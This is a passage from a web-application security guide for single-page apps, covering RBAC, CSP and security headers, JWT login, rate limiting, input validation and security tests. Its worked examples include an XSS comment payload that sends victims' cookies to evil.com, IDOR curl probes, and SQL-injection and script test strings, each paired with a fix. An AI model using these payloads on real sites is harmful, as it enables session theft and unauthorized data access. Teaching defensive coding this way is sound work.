    const response = await fetch('/api/refresh', {
        method: 'POST',
        credentials: 'include'  // Send httpOnly cookie
    });

    const { accessToken } = await response.json();
    localStorage.setItem('accessToken', accessToken);
}
```

#### Role-Based Access Control (RBAC)

```javascript
// Middleware
function requireRole(allowedRoles) {
    return (req, res, next) => {
        if (!req.user) {
            return res.status(401).json({ error: 'Unauthorized' });
        }

        if (!allowedRoles.includes(req.user.role)) {
            return res.status(403).json({ error: 'Forbidden' });
        }

        next();
    };
}

// Routes
app.get('/api/admin/users', requireRole(['admin']), getUsers);
app.get('/api/accounting', requireRole(['admin', 'accountant']), getFinancials);
app.get('/api/profile', requireRole(['user', 'admin']), getProfile);
```

---

### 3. Content Security Policy (CSP)

**What is CSP**: HTTP header that controls which resources can load.

**Implementation**:
```javascript
// Express middleware
const helmet = require('helmet');

app.use(helmet.contentSecurityPolicy({
    directives: {
        defaultSrc: ["'self'"],
        scriptSrc: [
            "'self'",
            "https://trusted-cdn.com"
        ],
        styleSrc: [
            "'self'",
            "'unsafe-inline'",  // Allow inline styles (be careful)
            "https://fonts.googleapis.com"
        ],
        imgSrc: [
            "'self'",
            "data:",
            "https:"
        ],
        connectSrc: [
            "'self'",
            "https://api.example.com",
            "wss://websocket.example.com"
        ],
        fontSrc: [
            "'self'",
            "https://fonts.gstatic.com"
        ],
        objectSrc: ["'none'"],
        upgradeInsecureRequests: []
    }
}));
```

**Result Header**:
```http
Content-Security-Policy:
    default-src 'self';
    script-src 'self' https://trusted-cdn.com;
    style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
    img-src 'self' data: https:;
    connect-src 'self' https://api.example.com wss://websocket.example.com;
    font-src 'self' https://fonts.gstatic.com;
    object-src 'none';
    upgrade-insecure-requests
```

**What This Prevents**:
- ✅ XSS attacks (scripts must come from trusted sources)
- ✅ Clickjacking
- ✅ Malicious iframes
- ✅ Data exfiltration to untrusted domains

---

### 4. Security Headers

```javascript
const helmet = require('helmet');

app.use(helmet({
    // Content Security Policy
    contentSecurityPolicy: {
        directives: {
            defaultSrc: ["'self'"],
            scriptSrc: ["'self'", "trusted-cdn.com"]
        }
    },

    // Prevent clickjacking
    frameguard: { action: 'deny' },

    // Prevent MIME type sniffing
    noSniff: true,

    // Force HTTPS
    hsts: {
        maxAge: 31536000,
        includeSubDomains: true,
        preload: true
    },

    // Disable X-Powered-By header
    hidePoweredBy: true,

    // XSS filter (legacy browsers)
    xssFilter: true,

    // Referrer policy
    referrerPolicy: { policy: 'no-referrer' }
}));
```

**Result Headers**:
```http
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
X-XSS-Protection: 1; mode=block
Referrer-Policy: no-referrer
```

---

### 5. API Security

#### Authentication

```javascript
const jwt = require('jsonwebtoken');
const bcrypt = require('bcrypt');

// Registration
app.post('/api/register', async (req, res) => {
    const { email, password } = req.body;

    // Validate
    if (!email || !password) {
        return res.status(400).json({ error: 'Missing fields' });
    }

    // Hash password
    const hashedPassword = await bcrypt.hash(password, 12);

    // Create user
    const user = await User.create({
        email,
        password: hashedPassword
    });

    res.json({ message: 'User created' });
});

// Login
app.post('/api/login', async (req, res) => {
    const { email, password } = req.body;

    // Find user
    const user = await User.findOne({ where: { email } });
    if (!user) {
        return res.status(401).json({ error: 'Invalid credentials' });
    }

    // Verify password
    const valid = await bcrypt.compare(password, user.password);
    if (!valid) {
        return res.status(401).json({ error: 'Invalid credentials' });
    }

    // Generate token
    const token = jwt.sign(
        { userId: user.id, role: user.role },
        process.env.JWT_SECRET,
        { expiresIn: '1h' }
    );

    res.cookie('authToken', token, {
        httpOnly: true,
        secure: true,
        sameSite: 'strict'
    });

    res.json({ user: { id: user.id, email: user.email } });
});
```

#### Rate Limiting

```javascript
const rateLimit = require('express-rate-limit');
const RedisStore = require('rate-limit-redis');

// Create Redis client
const redis = require('redis');
const client = redis.createClient();

// Global rate limiter
const globalLimiter = rateLimit({
    store: new RedisStore({ client }),
    windowMs: 15 * 60 * 1000,
    max: 100,
    message: 'Too many requests from this IP'
});

// Strict rate limiter for sensitive endpoints
const strictLimiter = rateLimit({
    store: new RedisStore({ client }),
    windowMs: 15 * 60 * 1000,
    max: 5,
    message: 'Too many attempts, please try again later',
    skipSuccessfulRequests: true
});

app.use('/api/', globalLimiter);
app.post('/api/login', strictLimiter, loginHandler);
app.post('/api/transfer', strictLimiter, transferHandler);
```

#### Input Validation & Sanitization

```javascript
const { body, validationResult } = require('express-validator');

app.post('/api/users',
    // Validation rules
    body('email').isEmail().normalizeEmail(),
    body('age').isInt({ min: 18, max: 120 }),
    body('website').optional().isURL(),
    body('bio').trim().escape(),

    // Handler
    async (req, res) => {
        // Check validation errors
        const errors = validationResult(req);
        if (!errors.isEmpty()) {
            return res.status(400).json({ errors: errors.array() });
        }

        // Process validated data
        await createUser(req.body);
        res.json({ message: 'User created' });
    }
);
```

---

## Security Best Practices

### Development Phase

**1. Secure Coding Guidelines**:
- ✅ Never trust client-side data
- ✅ Validate all inputs server-side
- ✅ Use prepared statements for database queries
- ✅ Implement proper error handling (don't leak info)
- ✅ Use strong cryptography (bcrypt for passwords)
- ✅ Keep secrets in environment variables
- ✅ Follow principle of least privilege

**2. Code Review Checklist**:
- ✅ All user inputs validated and sanitized?
- ✅ Authentication required for sensitive operations?
- ✅ Authorization checks in place?
- ✅ No sensitive data in client-side code?
- ✅ Proper error handling without info leakage?
- ✅ HTTPS enforced?
- ✅ Security headers configured?
- ✅ Dependencies up to date?

**3. Dependency Management**:
```bash
# Regular audits
npm audit
npm audit fix

# Use tools
npx snyk test
npx depcheck
```

---

### Deployment Phase

**1. HTTPS Everywhere**:
```javascript
// Redirect HTTP to HTTPS
app.use((req, res, next) => {
    if (req.secure || req.headers['x-forwarded-proto'] === 'https') {
        next();
    } else {
        res.redirect(301, `https://${req.headers.host}${req.url}`);
    }
});
```

**2. Environment Variables**:
```bash
# .env (never commit!)
JWT_SECRET=super-secret-random-string-256-bits
DB_PASSWORD=another-secret-password
API_KEY=sk-1234567890abcdef

# Use in code
const secret = process.env.JWT_SECRET;
```

**3. Logging & Monitoring**:
```javascript
const winston = require('winston');

const logger = winston.createLogger({
    level: 'info',
    format: winston.format.json(),
    transports: [
        new winston.transports.File({ filename: 'error.log', level: 'error' }),
        new winston.transports.File({ filename: 'combined.log' })
    ]
});

// Log security events
logger.info('Login attempt', { email, ip: req.ip, success: true });
logger.warn('Failed login', { email, ip: req.ip, attempts: 3 });
logger.error('SQL injection attempt', { query, ip: req.ip });
```

---

### Runtime Phase

**1. Regular Security Scans**:
```bash
# Automated scanning
npm audit
snyk test

# OWASP ZAP
zap-cli quick-scan --self-contained https://example.com

# Burp Suite
# Manual testing with Burp Suite Pro
```

**2. Penetration Testing**:
- Manual security testing
- Automated vulnerability scanning
- Bug bounty programs
- Third-party security audits

**3. Incident Response Plan**:
1. **Detection**: Monitoring, logging, alerts
2. **Containment**: Isolate affected systems
3. **Investigation**: Determine scope and impact
4. **Remediation**: Fix vulnerabilities
5. **Recovery**: Restore services
6. **Post-Mortem**: Learn and improve

---

## Testing SPAs

### Manual Testing Tools

**1. Browser DevTools**:
- Network tab: Monitor API calls
- Console: Test JavaScript injection
- Application tab: Inspect storage
- Sources tab: Debug JavaScript

**2. Burp Suite**:
```
Setup:
1. Configure browser to use Burp proxy (127.0.0.1:8080)
2. Navigate to SPA
3. Intercept and modify requests
4. Use Scanner for automated testing
5. Use Repeater for manual testing
```

**3. OWASP ZAP**:
```bash
# Automated scan
zap-cli quick-scan --self-contained https://example.com

# Spider the SPA
zap-cli spider https://example.com

# Active scan
zap-cli active-scan https://example.com
```

**4. Postman**:
- Test API endpoints directly
- Automate API testing
- Collection runner for test suites

---

### Automated Testing

**Unit Tests**:
```javascript
// Jest + React Testing Library
import { render, screen, fireEvent } from '@testing-library/react';
import userEvent from '@testing-library/user-event';

test('prevents XSS in comment input', () => {
    render(<CommentForm />);

    const input = screen.getByLabelText('Comment');
    const malicious = '<script>alert("XSS")</script>';

    userEvent.type(input, malicious);
    fireEvent.submit(screen.getByRole('button'));

    // Should be escaped
    expect(screen.queryByText(malicious)).not.toBeInTheDocument();
});
```

**Integration Tests**:
```javascript
// Cypress
describe('Authentication', () => {
    it('prevents SQL injection in login', () => {
        cy.visit('/login');

        cy.get('input[name="email"]').type("admin'--");
        cy.get('input[name="password"]').type('anything');
        cy.get('button[type="submit"]').click();

        cy.get('.error').should('contain', 'Invalid credentials');
        cy.url().should('include', '/login');  // Should not be logged in
    });
});
```

**Security Tests**:
```javascript
// Jest + Supertest
const request = require('supertest');
const app = require('./app');

describe('API Security', () => {
    test('prevents IDOR attacks', async () => {
        // Login as user 123
        const res1 = await request(app)
            .post('/api/login')
            .send({ email: 'user123@example.com', password: 'pass' });

        const token = res1.body.token;

        // Try to access another user's data (user 124)
        const res2 = await request(app)
            .get('/api/users/124/profile')
            .set('Authorization', `Bearer ${token}`);

        expect(res2.status).toBe(403);  // Should be forbidden
    });

    test('enforces rate limiting', async () => {
        const promises = [];

        // Make 10 rapid requests
        for (let i = 0; i < 10; i++) {
            promises.push(
                request(app).post('/api/login').send({ email: 'test', password: 'test' })
            );
        }

        const results = await Promise.all(promises);
        const rateLimited = results.filter(r => r.status === 429);

        expect(rateLimited.length).toBeGreaterThan(0);  // Some should be rate limited
    });
});
```

---

## Real-World Examples

### Example 1: Juice Shop - Score Board Discovery

**Attack**:
```bash
# Step 1: Download main.js
curl https://juice5.wonkatech.org/main.js -o main.js

# Step 2: Search for hidden routes
grep -oE 'path:"[^"]+' main.js | grep -i score
# Result: path:"score-board"

# Step 3: Access hidden route
# Navigate to: https://juice5.wonkatech.org/#/score-board
# Success! Found the hidden scoreboard
```

**Lesson**: Never rely on "security through obscurity"

---

### Example 2: IDOR in API

**Vulnerable Code**:
```javascript
// GET /api/users/123
app.get('/api/users/:id', async (req, res) => {
    const user = await User.findById(req.params.id);
    res.json(user);  // No authorization check!
});
```

**Attack**:
```bash
# Get own profile
curl https://api.example.com/users/123 -H "Authorization: Bearer $TOKEN"

# Change ID to access another user
curl https://api.example.com/users/124 -H "Authorization: Bearer $TOKEN"
# Success! Can see other users' data
```

**Fixed Code**:
```javascript
app.get('/api/users/:id', requireAuth, async (req, res) => {
    const user = await User.findById(req.params.id);

    // Verify ownership or admin
    if (user.id !== req.user.id && req.user.role !== 'admin') {
        return res.status(403).json({ error: 'Forbidden' });
    }

    res.json(user);
});
```

---

### Example 3: XSS in Comments

**Vulnerable Code**:
```javascript
// React component
function CommentList({ comments }) {
    return (
        <div>
            {comments.map(comment => (
                <div dangerouslySetInnerHTML={{ __html: comment.text }} />
            ))}
        </div>
    );
}
```

**Attack**:
```javascript
// Attacker posts comment
POST /api/comments
{
    "text": "<img src=x onerror='fetch(\"https://evil.com/steal?cookie=\"+document.cookie)'>"
}

// When victims view comments, their cookies are stolen
```

**Fixed Code**:
```javascript
import DOMPurify from 'dompurify';

function CommentList({ comments }) {
    return (
        <div>
            {comments.map(comment => (
                <div>{comment.text}</div>  // React escapes by default
            ))}
        </div>
    );
}

// Or if HTML is needed:
function CommentList({ comments }) {
    return (
        <div>
            {comments.map(comment => (
                <div dangerouslySetInnerHTML={{
                    __html: DOMPurify.sanitize(comment.text)
                }} />
            ))}
        </div>
    );
}
```

---

## Conclusion

### Key Takeaways

**SPAs Are Not Inherently Less Secure**, but they have unique challenges:
- All code is visible to attackers
- Heavy reliance on API security
- Client-side storage vulnerabilities
- Complex JavaScript attack surface

**Defense in Depth**:
1. **Never trust the client** - validate everything server-side
2. **Authentication & Authorization** - proper token management and access control
3. **Input Validation** - sanitize all user input
4. **Output Encoding** - prevent XSS
5. **Security Headers** - CSP, HSTS, X-Frame-Options
6. **Rate Limiting** - prevent abuse
7. **Dependency Management** - keep packages updated
8. **Monitoring & Logging** - detect attacks early

**Testing is Essential**:
- Manual testing with DevTools
- Automated security testing
- Regular dependency audits
- Penetration testing
- Bug bounty programs

### Resources

**Security Tools**:
- Burp Suite: https://portswigger.net/burp
- OWASP ZAP: https://www.zaproxy.org/
- Snyk: https://snyk.io/
- npm audit: Built into npm

**Learning Resources**:
- OWASP Juice Shop: https://owasp-juice.shop/
- PortSwigger Web Security Academy: https://portswigger.net/web-security
- HackTheBox: https://www.hackthebox.com/
- PentesterLab: https://pentesterlab.com/

**Documentation**:
- OWASP Top 10: https://owasp.org/www-project-top-ten/
- CSP Guide: https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP
- JWT Best Practices: https://tools.ietf.org/html/rfc8725

---

**Document Version**: 1.0
**Last Updated**: 2025-09-26
**Author**: Walter Barr